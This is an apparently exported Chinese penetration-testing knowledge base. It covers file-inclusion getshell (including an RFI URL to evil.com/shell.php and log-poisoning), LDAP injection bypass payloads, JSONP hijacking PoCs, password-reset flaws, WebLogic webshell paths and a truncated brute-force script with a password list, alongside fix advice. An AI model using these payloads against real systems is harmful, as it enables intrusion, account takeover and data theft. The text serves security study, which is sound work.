感觉利用起来都比较鸡肋，有需要可以参考：浅谈文件包含漏洞 RFI getshell 如果支持远程文件包含，那么直接http://127.0.0.1:9999/index.php?file=http://evil.com/shell.php即可getshell，因为出现的情况实在是太少了，就不多说了。 LFI+文件上传 getshell 这是本地文件包含漏洞想要getshell的最容易想到的方法之一。 网站存在LFI漏洞，同时存在上传功能，如上传头像、证明信息等，那么我们可以上传一个包含恶意代码的任意后缀文件，如.png 其中.png的内容包含 利用如下： http://127.0.0.1:9999/index.php?file=shell.png&shell=phpinfo(); [!tip] 可能上传的文件中干扰因素过多，导致利用的展示界面很乱，那么我们可以通过file_put_contents()等函数单独再写一个webshell到其他文件中。 LFI+日志文件 getshell 日志文件往往会包含我们的请求记录，如果我们知道日志的文件位置，那么我们就可以将恶意的php代码写入到日志中，然后再通过文件包含漏洞就可以执行相关的代码。 举例： URL访问 http://127.0.0.1:9999/index.php?file=shell.png&test= payload会被记录到日志文件中，此时日志文件如下 我们只需要包含这个日志文件，那么就可以getshell 日志默认路径: 可能会有所出入，一切以实际情况为准 名 路径 tomcat /usr/local/tomcat/logs/localhost_access_log.2020-09-21.txt apache+linux /var/log/apache2/access.log/var/log/httpd/access.log/etc/httpd/logs/access.log nginx /var/log/nginx/access.log/usr/local/nginx/logs/access.log LFI+/proc/self/environ getshell 在linux中，如果php以cgi方式运行，那么/proc/self/environ中会包含请求头中的UA信息，也就可以getshell GET lfi.php?file=../../../../../../proc/self/environ HTTP/1.1 User-Agent: 可参考：shell via LFI - proc/self/environ method LFI+phpinfo getshell 除了需要存在一个LFI漏洞外，还需要存在一个phpinfo()页面 原理：向phpinfo()页面POST上传一个文件，PHP就会将文件保存成一个临时文件，路径通常为：/tmp/php[6个随机字符],这个临时文件，在请求结束后就会被删除。有点类似于条件竞争的操作。 利用工具：https://github.com/diegoalbuquerque/LFI-phpinfo-RCE 利用时需要修改工具中的参数和目标参数适配 LFI+session getshell 很鸡肋很鸡肋，要求你能控制session才行，一般我们可以先看下session中的内容哪些部分是可控的 php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sessions /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 如果可以控制session的内容，那么相当于可以控制文件/var/lib/php/sessions的内容，结合前面的操作就可以直接getshell了 绕过 指定前缀 漏洞代码： 绕过方法： 通过../回溯符跳转到其他目录，如../../../proc/self/environ 还是通过回溯符../，主要是对内容进行编码 URL编码 2次URL编码 容器/服务器支持的编码，..%c0%af == ../，..%c1%9c == ..\\ 指定后缀 漏洞代码： 绕过方法： 支持RFI的情况下，可以用?和#来绕过，?后面表示参数，#后面表示锚点，都不会影响到实际的URL 利用伪协议zip://和phar://，以zip为例，先创建一个压缩包，压缩目录为test/test/test.php，然后利用为zip://xxx.zip#test即可 php 的情况下，可以使用长度截断，只需要不断的重复./即可，linux下4096字节时会达到最大值，在window下是256字节，在达到最大值后，后面的部分将会被省略。如shell.php/./././././省略/./././；注意不能超过容器支持的最大长度，不然会提示GET请求太长。 php 且magic_quotes_gpc=off的情况下，存在00截断，和上传中的00截断类似，让后端误以为这是结束符 修复建议 过滤.（点）/（反斜杠）\\（反斜杠）等特殊字符 尽量关闭allow_url_include配置 PHP 中使用 open_basedir 配置限制访问在指定的区域 对需要包含的文件设置文件白名单 参考 文件包含漏洞 php文件包含漏洞Getshell的不同姿势 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-04 08:56:05 "},"个人知识库/01.渗透测试/02.WEB漏洞/20.LDAP注入/LDAP注入.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/20.LDAP注入/LDAP注入.html","title":"LDAP注入","keywords":"","body":" LDAP结构 使用场景 LDAP查询语法 详细解释 LDAP注入 LDAP注入原因 LDAP注意事项 LDAP过滤器 LDAP注入举例 AND LDAP注入 OR LDAP注入 LDAP盲注 LDAP AND盲注 LDAP OR盲注 LDAP靶场 靶场截图 下载地址 利用过程 LDAP注入防御 总结 参考文章 趣事 LDAP简介 LDAP(Lightweight Directory Access Protocol)：轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现，是运行于TCP/IP之上的协议，端口号为：389， 加密636（SSL） LDAP结构 属性 解释 dn（Distinguished Name） 一条记录的位置 ，如上图，我们要想描述baby这个节点，描述如下cn=baby,ou=marketing,ou=pepple,dc=mydomain,dc=org dc(domain compoent) 一条记录所属区域 域名部分 ou (Organization Unit) 一条记录所属组织 cn/uid（Common Name） 一条记录的名字/ID Entry 条目记录数 使用场景 实战中能遇到的主要是 大厂 和 内网 LDAP服务是许多公司和机构日常操作的关键组成部分，目录服务如微软的Microsoft Active Directory，Novell E-Directory和RedHat Directory服务都基于LDAP协议。不过也有其他的应用和服务会利用LDAP服务，简单是说Windows下在Server 服务器上常用AD，在Linux系统常用的服务是Openldap。 LDAP查询语法 # search语法 attribute operator value # search filter options: ( \"&\" or \"|\" (filter1) (filter2) (filter3) ...) (\"!\" (filter)) 详细解释 =(等于) 查找\"Name\"属性为\"John\"的所有对象: (Name=John) 这条语句会返回\"name\"为\"john\"的所有对象，以便强调LDAP语句的开始和结束 &(逻辑与) 如果具有多个条件，并且希望所有条件都能满足，则使用该语法。 (&(Name=John)(live=Dallas)) 以上语句查询居住在Dallas 且 名为John的所有人员 |(逻辑或) 如果具有多个条件，并且希望满足其中一个条件，则使用该语法。 (&(Name=John)(live=Dallas)) 以上语句查询居住在Dallas 或 名为John的所有人员 !(逻辑非) 此操作符用来排除具有特定属性的对象: (!Name=John) 查找所有\"name\"不为\"John\"的人员 通配符 * 可以用通配符表示值可以等于任何内容 (title=*) 查找具有职务头衔的所有人员 (Name=Jo*) 查找所有\"Name\"以\"Jo\"开头的人员 最后，举一个较复杂的例子: (&(Name=John)(|(live=Dallas)(live=Austin))) 查找所有居住在Dallas或Austin，并且名为John的人员 LDAP注入 LDAP注入原因 LDAP注入和SQL注入比较类似，不过没有SQL注入中那么多华丽花哨的东西，要简单一些。二者都是没有对用户输入的合法性进行验证，而是直接将数据发送给服务器进行查询，因此攻击者可以注入任意恶意代码。 LDAP注意事项 (&(attribute=value)(injected_filter)) (second_filter) 在OpenLDAP中，第二个过滤器会被忽略，只有第一个会被执行，那么类似上面的这种注入就可以成功的。 而在ADAM中，有两个过滤器的查询是不被允许的，那么这种注入是没什么用的。 LDAP过滤器 LDAP 注入的一个重要原因就是过滤器的问题，LDAP 在对目录内容进行搜索的时候，需要过滤器来进行配置 LDAP过滤器定义于RFC4515中，这些过滤器的结构可概括如下： Fileter = (filtercomp) Filtercomp = and / or / not / item And = & filterlist Or = | filterlist Not = ! filter Filterlist = 1*filter Item = simple / present / substring Simple = “=” / “~=” / ”>=” / “所有过滤器必须置于括号中，只有简化的逻辑操作符(AND、OR、NOT)和关系操作符(=、>=、可用于构造它们。特殊符“*”可用来替换过滤器中的一个或多个字符。 除使用逻辑操作符外，RFC4256还允许使用下面的单独符号作为两个特殊常量： (&) ->Absolute TRUE (|) ->Absolute FALSE LDAP注入举例 AND LDAP注入 当后端的代码如下 (&(parameter1=value1)(parameter2=value2)) 这里value1和value2都会被查询，其中value1和value2是用户可控的，如果过滤不完善，就会存在LDAP注入的可能。 比如一个用户登录的场景，用户输入username和password，应用会构造一个过滤器并发给LDAP服务器进行查询。 (&(username=uname)(password=pwd)) 当用户输入一个有效的用户名，例如admin，那么就有可能在username字段后面进行注入，从而在不知道密码的情况下进行登陆。 payload: admin)(&)) result: (&(username=admin)(&))(password=123)) LDAP服务器只会处理第一个过滤器，而第一个过滤器永真，因此绕过了登录框 OR LDAP注入 当后端代码如下： (|(parameter1=value1)(parameter2=value2)) 一个典型的OR LDAP注入的场景就是： 假设一个资源管理器允许用户了解系统中可用的资源(打印机、扫描器、存储系统等)。用于展示可用资源的查询为： (|(type=Rsc1)(type=Rsc2)) Rsc1和Rsc2表示系统中不同种类的资源，例如，Rsc1=printer，Rsc2=scanner用于列出系统中所以可用的打印机和扫描器。 payload: Rsc1 => printer)(uid=*) result: (|(type=printer)(uid=*))(type=scanner)) LDAP服务器会响应所有的打印机和用户对象 LDAP盲注 LDAP AND盲注 假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器： (&(objectclass=printer)(type=Epson*)) 使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击*)(objectClass=*))(&(objectClass=void，Web应用会构造如下查询： (&(objectclass=*)(objectClass=*))(&(objectClass=void)(type=Epson*)) 仅对第一个过滤器进行处理： (&(objectclass=*)(objectClass=*)) 结果是，打印机的图标会一定显示出来，因为该查询永远会有结果，过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。 例如构造如下的注入： (&(objectClass=*)(objectClass=users))(&(objectClass=foo)(type=Epson*)) (&(objectClass=*)(objectClass=resources))(&(objectClass=foo)(type=Epson*)) 这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。 LDAP OR盲注 这种情况下，用于推测想要的信息的逻辑是相反的，因为使用的是OR逻辑操作符。接下来使用的是同一个例子，OR环境的注入为： (|(objectClass=void)(objectClass=void))(&(objectClass=void)(type=Epson*)) 这个LDAP查询没有从LDAP目录服务获得任何对象，打印机的图标也不会显示给客户端(FALSE)。如果在响应的Web页面中有任何图标，则响应为TRUE。故攻击者可以注入下列LDAP过滤器来收集信息： (|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=Epson*)) (|(objectClass=void)(objectClass=resources))(&(objectClass=void)(type=Epson*)) LDAP靶场 靶场截图 下载地址 链接：https://pan.baidu.com/s/1x50hYn2Q4jIsLHbDnU3CVA 提取码：8yej 此处以 LDAP attacks ==> Example 2 为例 利用过程 使用nmap扫描，发现开启389端口 C:\\Users\\h>nmap -Pn -p- -sV 192.168.30.144 -n -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 15:29 ?D1ú±ê×?ê±?? Nmap scan report for 192.168.30.144 Host is up (0.0034s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0) 80/tcp open http Apache httpd 2.2.16 ((Debian)) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X MAC Address: 00:0C:29:63:12:24 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.09 seconds 访问Example 2，使用burp抓包，提示认证成功 根据第一步扫出来的 389 端口，再加上此处的登陆，猜测他的判定语句为 (&(name=hacker)(passwd=hacker)) 其中2个 hacker 为我们的可控制变量 一、无密码登录 尝试构造（先正常闭合，然后再截断后面） (&(name=hacker))%00)(passwd=hacker)) 服务器在对这个条件判定时，只会执行(&(name=hacker))，永为真，即无密码直接登陆，密码随便输，效果如下： 二、用户遍历 通过上方的结果，我们已经能无密码登陆用户了，但是如果该用户权限不足需要新的用户怎么办呢？ 构造语句如下（其中，* 为通配符） (&(name=h*))%00)(passwd=xxx)) 如上图，构造的payload可直接登录hacker账号 尝试对首字母进行遍历，可成功获取 admin 账户 LDAP注入防御 LDAP注入的防御和SQL注入的防御类似，主要是对用户的输入进行合法性验证,只要守好数据的入口和出口，就能有效的防御攻击。 下图包含了LDAP中用到的特殊字符和需要转义处理的字符： 具体实现可参考如下 PHP 代码 #!php function ldapspecialchars($string) { $sanitized=array('\\\\' => '\\5c', '*' => '\\2a', '(' => '\\28', ')' => '\\29', \"\\x00\" => '\\00'); return str_replace(array_keys($sanitized),array_values($sanitized),$string); } 总结 和SQL注入类似，都是需要先猜测后端的语句写法，然后闭合语句，再通过传入自己的恶意语句，达到恶意执行LDAP语句的目的。 参考文章 LDAP 注入（Injection）入门学习 LDAP安全 (LDAP注入与匿名访问) LDAP注入漏洞与防御 LDAP注入与防御剖析 趣事 这篇文章已经写了有几年了，自己都有点记不清了，内容中有个百度云的链接，本来想看看是不是失效了，结果因为公司网络问题打不开，一搜索发现文章已经被搬运了。。。而且我完全不知情哈哈哈哈 这个更过分，直接复制完，也没放我前博客的链接，还疑似参加了原创计划？不过阅读量这么多是我没想到的哈哈哈 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-21 15:06:50 "},"个人知识库/01.渗透测试/02.WEB漏洞/21.JSONP数据劫持/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/21.JSONP数据劫持/","title":"21.JSONP数据劫持","keywords":"","body":" 介绍 漏洞原理 漏洞代码 利用场景 漏洞利用 POC 另一个POC 修复建议 扩展 介绍 JSONP（JSON with Padding）是 json 的一种\"使用模式\"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据；它利用的是script标签的src属性不受同源策略影响的特性，使网页可以得到从其他来源动态产生的json数据，因此可以用来实现跨域读取数据。 更通俗的说法：JSONP就是利用 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。 漏洞原理 和CSRF类似，都需要用户交互，而CSRF主要是以用户的账户进行增删改的操作，jsonp则主要用来劫持数据。 当网站通过JSONP方式传递用户敏感信息时，攻击者可以伪造JSONP调用页面，诱导被攻击者访问来达到窃取用户信息的目的；jsonp数据劫持就是攻击者获取了本应该传给网站其他接口的数据。 [!note] 可能还是有点抽象，可以继续往后看例子，其实很简单 漏洞代码 假设这是目标网站上的代码，然后我们利用漏洞就可以劫持到里面的数据，如username、phone 快速启动php环境 php -S 127.0.0.1:9999 实现效果 利用场景 如上图，所有包含有callback等回调函数的，且请求方式为GET，没有验证referer等，都可以尝试下该漏洞 如果返回内容是json格式的，但是没有回调函数，我们可以尝试手动添加回调函数去试试运气，一些常见的如下： _callback=mstkey _cb=mstkey callback=mstkey cb=mstkey jsonp=mstkey jsonpcallback=mstkey jsonpcb=mstkey jsonp_cb=mstkey json=mstkey jsoncallback=mstkey jcb=mstkey call=mstkey callBack=mstkey jsonpCallback=mstkey jsonpCb=mstkey jsonp_Cb=mstkey jsonCallback=mstkey ca=mstkey 漏洞利用 当我们发现信息泄露的 jsonp 接口以后，我们需要构造一个恶意html页面，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会向这个接口请求用户的敏感数据，并传送到攻击者的服务器上。 POC 基于实现回调函数 function xxx(data) { alert(data.username); } 保存为html，诱导受害者访问，可见成功获取到了username信息 简而言之：存在信息泄漏的JSONP接口http://127.0.0.1:9999/test.php?callback=xxx，攻击者构造POC后诱导用户访问POC，然后就会调用这个接口获取到敏感数据，获取到的敏感数据被攻击者截获了。 另一个POC 基于jquery $.getJSON(\"http://127.0.0.1:9999/test.php?callback=?\", function(data){ alert(data.phone); }); 修复建议 接受请求时检查referer来源； 在请求中添加token并在后端进行验证； 严格过滤callback函数名及JSON里数据的输出。 扩展 如果目标的header头没有设置Content-Type为json，而是html，那么也可以造成XSS漏洞 一个获取QQ号的JSONP劫持实例 推荐阅读：JSONP挖掘与高级利用 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-22 18:55:58 "},"个人知识库/01.渗透测试/03.思路技巧/01.利用SourceMap还原前端js代码.html":{"url":"个人知识库/01.渗透测试/03.思路技巧/01.利用SourceMap还原前端js代码.html","title":"01.利用SourceMap还原前端js代码","keywords":"","body":" 利用SourceMap还原前端js代码 F12 --> 调试器 利用 reverse-sourcemap 利用 restore-source-tree（失败了） 利用shuji（失败了） 利用SourceMap还原前端js代码 F12 --> 调试器 会发现多一个webpack选项，因为存在.js.map文件，能够还原 利用 reverse-sourcemap 安装 reverse-sourcemap npm install --global reverse-sourcemap 还原代码 reverse-sourcemap -v app.63304d959258070ef3be.js.map -o output 利用 restore-source-tree（失败了） https://github.com/alexkuz/restore-source-tree 安装 restore-source-tree git clone https://github.com/laysent/restore-source-tree.git cd restore-source-tree npm i -g restore-source-tree 还原代码 restore-source-tree chunk-vendors.6b92c4bd.js.map 会自动保存到 output 下，不知道是不是有bug 利用shuji（失败了） https://github.com/paazmaya/shuji npm install --global shuji Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:08 "},"个人知识库/01.渗透测试/03.思路技巧/02.任意用户密码重置的10种姿势.html":{"url":"个人知识库/01.渗透测试/03.思路技巧/02.任意用户密码重置的10种姿势.html","title":"02.任意用户密码重置的10种姿势","keywords":"","body":" 任意用户密码重置的10种姿势 验证码不失效 造成原因 测试方法 验证码直接返回 造成原因 测试方法 验证码未绑定用户 造成原因 测试方法 修改接收的手机或邮箱 造成原因 测试方法 本地验证绕过 造成原因 测试方法 跳过验证步骤 造成原因 测试方法 未效验用户字段的值 造成原因 测试方法 修改密码处ID可替换 造成原因 测试方法 Cookie值的替换 造成原因 测试方法 修改信息时替换字段 造成原因 测试方法 视频地址 大佬总结链接 任意用户密码重置的10种姿势 验证码不失效 造成原因 找回密码的时候获取的验证码缺少时间限制，仅判断了验证码的值是否正确，未判断验证码是否过期 测试方法 通过枚举找到真正的验证码完成验证 验证码直接返回 造成原因 直接输入目标手机号，点击获取验证码，并观察返回包即可 测试方法 输入手机号后点击获取验证码，验证码在客户端生成，并直接返回在Response以方便对接下来的验证码进行比对 验证码未绑定用户 造成原因 输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证 测试方法 在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码 修改接收的手机或邮箱 造成原因 用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法 输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 本地验证绕过 造成原因 客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入了正确的验证码。 测试方法 重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 跳过验证步骤 造成原因 对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法 首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面3链接到新密码的界面，输入密码重置成功。 未效验用户字段的值 造成原因 在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。 测试方法 使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 修改密码处ID可替换 造成原因 修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句： update user set password=\"qwer1234\" where id = ‘1’ 修改数据包里的id的值，即可修改他人密码。 测试方法 修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。 Cookie值的替换 造成原因 重置密码走到最后一步的时候仅判断唯一的用户标识cookie是否存在，并没有判断该cookie有没有通过之前重置密码过程的验证，导致可替换cookie重置他人用户密码。(cookie可指定用户获取。) 测试方法 重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户cookie，替换cookie到我们抓取的数据包中，发包测试。 修改信息时替换字段 造成原因 在执行修改信息的sql语句的时候，用户的密码也当作字段执行了，而且是根据隐藏参数loginid来执行的，这样就导致修改隐藏参数loginid的值，就可以修改他人的用户密码。 测试方法 修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 视频地址 http://loudong.360.cn/School/content/id/214 大佬总结链接 http://www.sqlsec.com/2017/10/resetpass.html Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-11-17 08:42:00 "},"个人知识库/01.渗透测试/03.思路技巧/03.API接口测试.html":{"url":"个人知识库/01.渗透测试/03.思路技巧/03.API接口测试.html","title":"03.API接口测试","keywords":"","body":" 接口简介 接口分类 接口文档 接口文档的作用 接口文档规范 测试准备 如何测试 测试思路 单流程 多流程 测试什么 测试举例 获取数据包 开始测试 接口简介 Web API是网络应用程序接口。包含了广泛的功能，网络应用通过API接口，可以实现存储服务、消息服务、计算服务等能力，利用这些能力可以进行开发出强大功能的web应用。 举例： 12306购票网站，所有的数据都在12306上，12306提供一整套接口，调用接口我们就可以获取到里面的数据。比如：在携程/艺龙等第三方网站上购买车票，实际就是调用了12306提供的接口获取库存等信息。 可以简单理解为：访问一个网址后，返回一堆json或者xml等特定格式的数据，这个网址就可以理解为一个web接口 接口分类 Webservice接口：走soap协议，请求报文和返回报文都是xml格式 HTTP API接口（常规客户）：走HTTP协议，通过路径来区分调用的方法，以RESTful风格为主，请求报文入参有多种形式，返回报文一般为json串，最常见的是get和post方法 接口文档 在项目开发中，web项目的前后端分离开发，APP开发，需要由前后端工程师共同定义接口，编写接口文档，之后大家都根据这个接口文档进行开发，到项目结束前都要一直维护。 接口文档的作用 1、项目开发过程中前后端工程师有一个统一的文件进行沟通交流开发 2、项目维护中或者项目人员更迭，方便后期人员查看、维护 接口文档规范 每一个接口的文档分为四部分：请求方法、URI、请求参数、返回参数 请求方法：获取(GET)、新增(POST)、修改(PUT)、删除(DELETE) 等 URI：调用这个接口需要访问的URI 请求参数：字段、描述、类型、是否必填、备注 返回参数：是否调用成功，返回的数据有哪些 测试准备 测试WEB API时，至少需要客户提供2个数据： API地址 接口文档 其他的按需要求客户提供，比如接口示例、认证token、sign校验算法等 如何测试 和平时的web测试一样，模拟客户端向服务器发送报文请求,服务器接收请求报文后对相应的报文做处理并向客户端返回应答,客户端接收应答的一个过程。 唯一的区别是接口测试需要自己构造参数，而web测试时网页会自动辅助构造参数。 测试思路 单流程 业务场景无上下游依赖，这个接口可以代表整个功能，如查询个人信息 构造参数 --> 发送请求 --> 校验结果 常规漏洞 ... 多流程 接口之间有数据流转，共同形成一个完成的业务流程，如注册功能 构造参数 --> 发送请求 --> 校验结果 常规漏洞 流程是否可以绕过，直接到达最后一步 ... 测试什么 主要以安全测试为主 测试举例 获取数据包 如果是提供的类似Swagger UI的接口文档，可以直接在网页中辅助构造请求包，输入参数发起请求，并用burp抓包即可 如果是提供的word文档等，则需要手动构造请求数据包（建议拿其他的数据包来修改，比如拿访问baidu.com的数据包） 假设API接口的地址为http://xxx.cn 构造数据包 POST /api/login HTTP/1.1 Host: xxx.cn User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Dnt: 1 Sec-Gpc: 1 Te: trailers Connection: close Content-Type: application/json Content-Length: 39 {\"username\":\"admin\",\"password\":\"admin\"} 开始测试 有了数据包，就和常规的测试一样了，主要在于思维的问题 根据上图的数据包，做一个大致的测试分析： 观察接口命名，采用驼峰命名法，是否存在其他不在接口文档的类似的测试接口，比如getUserInfos、getUserInfoByUid等 这个地方虽然参数是phone，那会不会后端模糊查询输入用户名也可以查询呢 查询任意用户信息的接口，应该存在鉴权机制 未授权访问 针对普通用户，每个人只能查询自己的信息 手机号进入后端查询用户的信息，肯定会进行数据库查询 是否可以模糊查询，比如1388888% 是否存在SQL注入 参数置空、过长或者输入特殊字符，会不会导致数据库报错抛出异常，获取一些敏感信息 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-14 09:55:53 "},"个人知识库/01.渗透测试/03.思路技巧/04.Weblogic上传shell路径.html":{"url":"个人知识库/01.渗透测试/03.思路技巧/04.Weblogic上传shell路径.html","title":"04.Weblogic上传shell路径","keywords":"","body":" 前言 漏洞点 路径 路径1：写入bea_wls_internal目录 路径2：写入console images目录 路径3：写入uddiexplorer目录 路径4：写入应用安装目录 shell无法访问 扩展：weblogic密码解密 前言 有时候拿到weblogic能命令执行，但是目标不能出网，不方便直接上线，这时就需要上个webshell来辅助后续的渗透 但是weblogic的web路径可能和常规的web系统不一样，不清楚的时候可能会一脸懵逼不知道上传到哪个目录下，以及如何访问，所以记录一下 漏洞点 不能出网 路径 路径1：写入bea_wls_internal目录 上传目录绝对路径： [!NOTE] 自己根据需要对照修改，命令执行的时候一般在目录sv0下 E:\\APP\\Middleware\\Oracle_Home\\user_projects\\domains\\sv0\\servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\6位随机字符\\war\\shell.jsp web访问路径： /bea_wls_internal/shell.jsp 路径2：写入console images目录 [!NOTE] 这个shell不是写在AdminServer下，需要能访问到console 上传目录绝对路径： E:\\APP\\Middleware\\Oracle_Home\\wlserver\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\ web访问路径： /console/framework/skins/wlsconsole/images/shell.jsp 路径3：写入uddiexplorer目录 [!NOTE] 和路径1类似，只不过这里是uddiexplorer罢了 上传目录绝对路径： E:\\APP\\Middleware\\Oracle_Home\\user_projects\\domains\\sv0\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\6位随机字符\\war\\shell.jsp web访问路径： /uddiexplorer/shell.jsp 路径4：写入应用安装目录 上传目录绝对路径： E:\\APP\\Middleware\\Oracle_Home\\user_projects\\domains\\sv0\\servers\\AdminServer\\tmp\\_WL_user\\项目名\\6位随机字符\\war\\shell.jsp web访问路径： /项目名/shell.jsp shell无法访问 有时候上传的shell无法访问，大概率是因为端口不对，weblogic不同端口开放的server也不一样，找一找能访问的端口的server即可。 主要查看weblogic的配置文件domains\\sv0\\config\\config.xml sv0 12.1.2.0.0 sv0 DefaultAuthenticator DefaultIdentityAsserter AuthenticatedUser XACMLRoleMapper XACMLAuthorizer DefaultAdjudicator DefaultCredentialMapper WebLogicCertPathProvider WebLogicCertPathProvider myrealm SystemPasswordValidator 8 1 myrealm {AES}xxx weblogic {AES}xxx AdminServer AdminServer 7002 8002 sv0 {AES}xxx 12.1.2.0.0 sv0 AdminServer ear D:\\test\\applications\\sv0 DDOnly false index AdminServer D:\\test\\applications\\index DDOnly false software AdminServer D:\\test\\software DDOnly false doas AdminServer war servers\\AdminServer\\upload\\dddd.war DDOnly false tniq AdminServer war servers\\AdminServer\\upload\\tttt.war DDOnly false AdminServer 如上配置只有AdminServer，所以我们写到AdminServer下都可以访问，如果配置了其他Server，则就需要根据端口开放情况写到其他的目录下 E:\\APP\\Middleware\\Oracle_Home\\user_projects\\domains\\sv0\\servers\\其他Server 扩展：weblogic密码解密 https://github.com/TideSec/Decrypt_Weblogic_Password Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-27 10:09:02 "},"个人知识库/01.渗透测试/03.思路技巧/05.网页接口加密暴破.html":{"url":"个人知识库/01.渗透测试/03.思路技巧/05.网页接口加密暴破.html","title":"05.网页接口加密暴破","keywords":"","body":" 前言 解决办法 实现代码 前言 平时测试的时候，可能会遇到一些接口（如登陆接口）中的某些数据是加密的，如下图： 一般的思路：通过逆向分析前端加密算法，拿到密钥，再写脚本模拟加密过程构造想要的数据 [!note] 上面的思路是常规的思路，如果代码存在混淆，则比较费时费力，甚至分析不出来 因为加密都是在前端执行的，那么我们只需要模拟前端的操作即可 此处抛开burp插件不谈 解决办法 通过js模拟操作即可 定位输入框和按钮 设置数据 点击按钮 分析代码，找到我们要输入的框 然后定位到数据，有jquery的话会方便很多，没有就使用原生的js也不影响 document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] 如果不好找，可以直接编辑html，手动添加id属性 然后再通过id进行定位 document.getElementById(\"testusername\") 定位后该插入数据的就插入数据，该点击的就点击，具体看下面的实现代码 实现代码 var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root','toor','admin','admin123','admin666','admin888','123456','12345','1234','123','12','1','administrator','administrators','admin123456','admin12345','admin1234','admin12','admin1','phpcms','jyxy','asd123','xiaoyin','daxiong','ironport','111111','0','11111111','112233','123123','123321','12345678','654321','666666','888888','abcdef','abcabc','abc123','a1b2c3','test','aaa111','123qwe','qwerty','qweasd','password','p@ssword','passwd','iloveyou','5201314','monkey','1234567','letmein','trustno1','dragon','baseball','master','sunshine','ashley','bailey','passw0rd','shadow','superman','qazwsx','michael','football','xiaoming','qq123456','taobao','wang1234','zxc','changeme','654310','user','Password1','Password123','sql','sqlserver','server','webserver123','pos','kingdee','anypass','jie1982','database','sapassword','9876','sa123','p@ssw0rd','sa','1q2w3e','1q2w3e4r','1234qwer','8848','sasa','asas','9','99','999','9999','99999','999999','9999999','99999999','8','88','888','8888','88888','8888888','88888888','7','77','777','7777','77777','777777','7777777','6','66','666','6666','66666','5','55','555','5555','55555','555555','4','44','444','4444','44444','444444','4444444','3','33','333','3333','33333','333333','2','22','222','2222','22222','222222','11','111','1111','11111','manager','!@#$%^&*()','qwerty123456','zxcvbn123456','sa1','as','aa','aaa','abcd1234','aaaaaa','asdfghjkl;\\'','sa123456789','sasasasa','@#$%&*()','gsp','asdf','power','123@#','778899','13579','12344321','147258','!@#$%^','!@#123','!@#$%^&*()','123!@#','!@##@!','1q2w3e4r','1q2w3e4r5t','1qaz2wsx','1qazxsw2','1qaz2wsx3edc','a','admin75','asd','c